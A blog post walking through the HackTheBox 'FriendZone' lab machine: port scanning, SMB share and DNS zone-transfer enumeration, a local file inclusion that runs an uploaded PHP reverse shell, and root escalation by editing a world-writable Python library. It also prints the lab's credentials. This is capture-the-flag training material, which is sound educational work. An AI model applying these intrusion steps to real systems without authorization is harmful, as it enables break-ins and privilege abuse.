---
title: "HackTheBox - WriteUp 4"
date: 2019-05-18T13:02:03+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# FriendZone

## Before Attack

`nmap -A -Pn -p1-65535 10.10.10.123`

Response:

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

Found `53/tcp` & SMB, check SMB first.

### SMB 

`nmap --script smb-enum-shares -p139,445 10.10.10.123` found shares and their absolute path.

Use `smbclient` to access:

```
$ smbclient -L -U guest -N //10.10.10.123

        Sharename       Type      Comment                                                            
        ---------       ----      -------                                                         
        print$          Disk      Printer Drivers                                                 
        Files           Disk      FriendZone Samba Server Files /etc/Files  <NO PERM>                         
        general         Disk      FriendZone Samba Server Files             <RO>                                            
        Development     Disk      FriendZone Samba Server Files             <RW>               
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))   
```

Get the files from share:  `/mnt/smb/general/creds.txt`

```
creds for the admin THING:
admin:WORKWORKHhallelujah@#
```

### 53/TCP DNS

Trying to access the web, notice you that you cannot access via IP directly, so let's make the `/etc/hosts` first.

Do a zone transfer scan:

```
╰─ dig axfr friendzoneportal.red @10.10.10.123  

; <<>> DiG 9.14.1 <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 1025 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: 二 5月 14 15:08:02 CST 2019
;; XFR size: 9 records (messages 1, bytes 309)
```

```
╰─ dig axfr friendzone.red @10.10.10.123                         

; <<>> DiG 9.14.1 <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 1023 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: 二 5月 14 15:07:49 CST 2019
;; XFR size: 8 records (messages 1, bytes 289)
```

Finally, these sites are accessible via web:

```
$ cat /etc/hosts

10.10.10.123 friendzoneportal.red
10.10.10.123 friendzone.red
10.10.10.123 administrator1.friendzone.red
10.10.10.123 uploads.friendzone.red
```

## Start attack

### Gobuster first

`gobuster -k -u https://administrator1.friendzone.red -w /root/dictlist/DirBuster-Lists/directory-list-2.3-medium.txt -x php -o gobus123.txt`

Response:

```
/images (Status: 301)
/login.php (Status: 200)
/dashboard.php (Status: 200)
/timestamp.php (Status: 200)
```

Timestamp?? Really strange...

### Access as admin

Trying to access VSFTPD, got permission denied, password incorrect.

Trying to access `https://administrator1.friendzone.red/login.php`, get: `Login Done ! visit /dashboard.php`

Check the dashboard, found `https://administrator1.friendzone.red/login.php?image_name=a.jpg&pagename=timestamp`

Using the last result of gobuster, you may guess there's a LFI here. That's it.

> https://uploads.friendzone.red/   <UPLOAD FORM NOT WORKING, RABBIT HOLE>

The only way to upload the file is via SMB, you have RW permission only on Development.

So upload a php reverse shell from pentest monkey and LFI it through the param `pagename` without file extension.

### Reverse shell

Access: `https://administrator1.friendzone.red/login.php?image_name=a.jpg&pagename=shell`

Before that, don't forget to modify the php reverse shell and get your `nc` ready in the terminal.

Next, just walk through the `/var/www` (the home of www-data). You will find a credential and login into ssh to get a interactive shell now.

```
$ cat /var/www/mysql_data.conf

db_user=friend
db_name=FZ
db_pass=Agpyu12!0.213$
```

### Interactive Shell and Privilege Escalation

Run LinEnum and Pspy and also LinuxPrivilegeChecker, Got the following results:

```
PSPY: /bin/sh -c /opt/server_admin/reporter.py (UID=0, Python2.7, ExecStart by CRON)

LinEnum:

[-] Accounts that have recently used sudo:
/home/friend/.sudo_as_admin_successful

PrivilegeChecker:

[+] World Writable Files
    -rwxrw-rw- 1 nobody nogroup 11 May 17 15:58 /etc/Development/hell.txt
    -rwxrw-rw- 1 nobody nogroup 31 May 17 16:17 /etc/Development/hsi.php
    -rwxrw-rw- 1 nobody nogroup 604 May 17 12:03 /etc/Development/hello.php
    -rwxrw-rw- 1 nobody nogroup 68 May 17 15:54 /etc/Development/fpin.php
    -rwxrw-rw- 1 nobody nogroup 5493 May 17 18:48 /etc/Development/prsb.php
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.remove
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.replace
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.load
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.access
    --w--w--w- 1 root root 0 May 17 19:08 /sys/fs/cgroup/memory/cgroup.event_control
    -rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.py
```

So, let's check `/opt/server_admin/reporter.py` :

- Permission 644, We only can read.
- A health check script written in python to send a mail, but the send command was commented.
- `import os`

`/usr/lib/python2.7/os.py` Should only be readable in normal system, however, here, we got 777: So just modify the file to do anything you want, just don't forget always put your code at the file end.

DONE.
